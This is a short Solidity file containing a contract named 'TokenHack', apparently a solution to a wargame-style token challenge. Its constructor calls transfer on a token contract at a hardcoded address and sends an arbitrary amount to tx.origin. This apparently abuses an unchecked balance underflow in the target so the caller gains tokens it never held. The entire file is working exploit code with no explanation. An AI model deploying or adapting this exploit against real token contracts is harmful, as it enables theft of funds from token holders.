pragma solidity ^0.4.18;

contract Token{
    function transfer(address _to, uint _value) public returns (bool){}
    function balanceOf(address _owner) public view returns (uint balance){}
}

contract TokenHack {

  address public txOrigin;
  mapping(address => uint) balances;
  Token target = Token(0x71f7851f4e0226ea8cf0e89b5d1e95ece2867b7b);

  function TokenHack(uint _initialSupply) public {
    txOrigin = tx.origin;
    target.transfer(tx.origin, _initialSupply);
  }
  
}